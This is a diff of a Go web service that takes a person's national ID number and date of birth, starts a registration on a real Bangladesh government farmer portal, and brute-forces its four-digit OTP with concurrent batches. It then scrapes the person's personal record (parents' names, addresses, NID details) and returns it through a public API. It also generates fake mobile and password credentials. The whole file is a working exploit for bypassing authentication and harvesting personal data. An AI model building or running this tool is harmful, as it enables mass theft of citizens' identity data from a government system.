@@ -2,14 +2,14 @@ package main
 
 import (
 	"crypto/rand"
-	"encoding/json"
 	"fmt"
 	"io"
-	"math"
+	mrand "math/rand"
 	"math/big"
 	"net/http"
+	"net/http/cookiejar"
 	"net/url"
-	"strconv"
+	"os"
 	"strings"
 	"sync"
 	"time"
@@ -21,9 +21,9 @@ import (
 
 // Configuration
 const (
-	MobilePrefix  = "016"
-	BatchSize     = 500
-	MaxWorkers    = 100
+	MobilePrefix   = "016"
+	BatchSize      = 500
+	MaxWorkers     = 100
 	TargetLocation = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form"
 )
 
@@ -52,18 +52,18 @@ func randomMobile(prefix string) string {
 
 func randomPassword() string {
 	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-	
+
 	// Generate uppercase letter
 	upperIdx, _ := rand.Int(rand.Reader, big.NewInt(26))
 	uppercase := string('A' + byte(upperIdx.Int64()))
-	
+
 	// Generate 8 random characters
 	result := make([]byte, 8)
 	for i := range result {
 		charIdx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
 		result[i] = chars[charIdx.Int64()]
 	}
-	
+
 	return "#" + uppercase + string(result)
 }
 
@@ -76,7 +76,8 @@ func generateOTPRange() []string {
 }
 
 func shuffleOTPRange(otpRange []string) {
-	rand.Shuffle(len(otpRange), func(i, j int) {
+	mrand.Seed(time.Now().UnixNano())
+	mrand.Shuffle(len(otpRange), func(i, j int) {
 		otpRange[i], otpRange[j] = otpRange[j], otpRange[i]
 	})
 }
@@ -96,7 +97,7 @@ func getSessionAndBypass(nid, dob, mobile, email string) (*SessionResult, error)
 	}
 
 	urlStr := "https://fsmms.dgf.gov.bd/farmers/bn/register"
-	
+
 	formData := url.Values{}
 	formData.Set("nid", nid)
 	formData.Set("dob", dob)
@@ -110,7 +111,6 @@ func getSessionAndBypass(nid, dob, mobile, email string) (*SessionResult, error)
 		return nil, fmt.Errorf("request creation failed: %v", err)
 	}
 
-	// Set headers
 	for k, v := range BaseHeaders {
 		req.Header.Set(k, v)
 	}
@@ -136,13 +136,14 @@ func getSessionAndBypass(nid, dob, mobile, email string) (*SessionResult, error)
 	return nil, fmt.Errorf("bypass failed — check NID, DOB, or mobile")
 }
 
+// --- OTP functions ---
 type OTPResult struct {
 	OTP  string
 	HTML string
 }
 
 func tryOTP(client *http.Client, cookies []*http.Cookie, otp string) *OTPResult {
-	urlStr := fmt.Sprintf("https://fsmms.dgf.gov.bd/farmers/bn/verify-otp?otp1=%s&otp2=%s&otp3=%s&otp4=%s", 
+	urlStr := fmt.Sprintf("https://fsmms.dgf.gov.bd/farmers/bn/verify-otp?otp1=%s&otp2=%s&otp3=%s&otp4=%s",
 		string(otp[0]), string(otp[1]), string(otp[2]), string(otp[3]))
 
 	req, err := http.NewRequest("GET", urlStr, nil)
@@ -150,13 +151,11 @@ func tryOTP(client *http.Client, cookies []*http.Cookie, otp string) *OTPResult 
 		return nil
 	}
 
-	// Set headers
 	for k, v := range BaseHeaders {
 		req.Header.Set(k, v)
 	}
 	req.Header.Set("Referer", "https://fsmms.dgf.gov.bd/portal/bn/farmer/otp-verification")
 
-	// Add cookies
 	for _, cookie := range cookies {
 		req.AddCookie(cookie)
 	}
@@ -181,9 +180,9 @@ func tryOTP(client *http.Client, cookies []*http.Cookie, otp string) *OTPResult 
 		}
 	}
 
-	if resp.StatusCode == 200 && 
-	   strings.Contains(htmlContent, "কৃষক নিবন্ধন") && 
-	   strings.Contains(htmlContent, `name="name"`) {
+	if resp.StatusCode == 200 &&
+		strings.Contains(htmlContent, "কৃষক নিবন্ধন") &&
+		strings.Contains(htmlContent, `name="name"`) {
 		fmt.Printf("✅ Correct OTP found: %s\n", otp)
 		return &OTPResult{OTP: otp, HTML: htmlContent}
 	}
@@ -226,6 +225,7 @@ func tryBatch(client *http.Client, cookies []*http.Cookie, otpBatch []string) *O
 	return nil
 }
 
+// --- Extraction and final data ---
 type ExtractedData struct {
 	ContractorName  string
 	FatherName      string
@@ -233,7 +233,6 @@ type ExtractedData struct {
 	NameEnglish     string
 	NameBangla      string
 	Gender          string
-	GenderDisplay   string
 	Nationality     string
 	NidV1           string
 	NidV2           string
@@ -261,8 +260,6 @@ func extractFields(html string) *ExtractedData {
 	}
 
 	data := &ExtractedData{}
-
-	// Basic extraction
 	data.ContractorName = doc.Find("#name").First().AttrOr("value", "")
 	data.FatherName = doc.Find("#father").First().AttrOr("value", "")
 	data.MotherName = doc.Find("#mother").First().AttrOr("value", "")
@@ -284,35 +281,37 @@ func extractFields(html string) *ExtractedData {
 	data.NidPerZipCode = doc.Find("#perPostcode").First().AttrOr("value", "")
 	data.NidPerPostOffice = doc.Find("#perPostOffice").First().AttrOr("value", "")
 	data.NidPerHolding = doc.Find("#perAddressLine1").First().AttrOr("value", "")
+	data.NidPerMouza = doc.Find("#perMouza").First().AttrOr("value", "")
 	data.Status = doc.Find("#status").First().AttrOr("value", "")
 	data.LocationId = doc.Find("#locationId").First().AttrOr("value", "")
 
 	return data
 }
 
+// --- Main data enrichment ---
 type FinalData struct {
-	NameBangla      string `json:"nameBangla"`
-	NameEnglish     string `json:"nameEnglish"`
-	NationalId      string `json:"nationalId"`
-	Pin             string `json:"pin"`
-	DateOfBirth     string `json:"dateOfBirth"`
-	FatherName      string `json:"fatherName"`
-	MotherName      string `json:"motherName"`
-	SpouseName      string `json:"spouseName"`
-	Gender          string `json:"gender"`
-	Occupation      string `json:"occupation"`
-	BirthPlace      string `json:"birthPlace"`
-	Nationality     string `json:"nationality"`
-	Division        string `json:"division"`
-	District        string `json:"district"`
-	Upazila         string `json:"upazila"`
-	Union           string `json:"union"`
-	Village         string `json:"village"`
-	Ward            string `json:"ward"`
-	ZipCode         string `json:"zip_code"`
-	PostOffice      string `json:"post_office"`
+	NameBangla       string `json:"nameBangla"`
+	NameEnglish      string `json:"nameEnglish"`
+	NationalId       string `json:"nationalId"`
+	Pin              string `json:"pin"`
+	DateOfBirth      string `json:"dateOfBirth"`
+	FatherName       string `json:"fatherName"`
+	MotherName       string `json:"motherName"`
+	SpouseName       string `json:"spouseName"`
+	Gender           string `json:"gender"`
+	Occupation       string `json:"occupation"`
+	BirthPlace       string `json:"birthPlace"`
+	Nationality      string `json:"nationality"`
+	Division         string `json:"division"`
+	District         string `json:"district"`
+	Upazila          string `json:"upazila"`
+	Union            string `json:"union"`
+	Village          string `json:"village"`
+	Ward             string `json:"ward"`
+	ZipCode          string `json:"zip_code"`
+	PostOffice       string `json:"post_office"`
 	PermanentAddress string `json:"permanentAddress"`
-	PresentAddress  string `json:"presentAddress"`
+	PresentAddress   string `json:"presentAddress"`
 }
 
 func enrichData(contractorName string, result *ExtractedData, nid, dob string) *FinalData {
@@ -371,27 +370,23 @@ func orDefault(value, defaultValue string) string {
 	return value
 }
 
+// --- Main ---
 func main() {
-	// Set Gin to release mode for better performance
 	gin.SetMode(gin.ReleaseMode)
-	
 	r := gin.Default()
 
-	// CORS middleware
 	r.Use(func(c *gin.Context) {
 		c.Header("Access-Control-Allow-Origin", "*")
 		c.Header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
 		c.Header("Access-Control-Allow-Headers", "Content-Type")
-		
+
 		if c.Request.Method == "OPTIONS" {
 			c.AbortWithStatus(204)
 			return
 		}
-		
 		c.Next()
 	})
 
-	// Base route
 	r.GET("/snsvapi", func(c *gin.Context) {
 		c.JSON(http.StatusOK, gin.H{
 			"message": "Enhanced NID Info API is running",
@@ -402,7 +397,6 @@ func main() {
 		})
 	})
 
-	// Main info route
 	r.GET("/snsvapi/get-info", func(c *gin.Context) {
 		nid := c.Query("nid")
 		dob := c.Query("dob")
@@ -437,7 +431,7 @@ func main() {
 				end = len(otpRange)
 			}
 			batch := otpRange[i:end]
-			
+
 			foundOTP = tryBatch(sessionResult.Client, sessionResult.Cookies, batch)
 			if foundOTP != nil {
 				break
@@ -469,7 +463,6 @@ func main() {
 		}
 	})
 
-	// Health check
 	r.GET("/snsvapi/health", func(c *gin.Context) {
 		c.JSON(http.StatusOK, gin.H{
 			"status":    "OK",
@@ -479,14 +472,13 @@ func main() {
 		})
 	})
 
-	// Test credentials
 	r.GET("/snsvapi/test-creds", func(c *gin.Context) {
 		mobile := randomMobile(MobilePrefix)
 		password := randomPassword()
 		c.JSON(http.StatusOK, gin.H{
-			"mobile": mobile,
+			"mobile":   mobile,
 			"password": password,
-			"note": "Randomly generated test credentials",
+			"note":     "Randomly generated test credentials",
 		})
 	})
 
@@ -501,6 +493,6 @@ func main() {
 	fmt.Printf("❤️  Health check: http://localhost:%s/snsvapi/health\n", port)
 
 	if err := r.Run(":" + port); err != nil {
-		panic(err)
+		panic(fmt.Sprintf("Failed to start server: %v", err))
 	}
 }
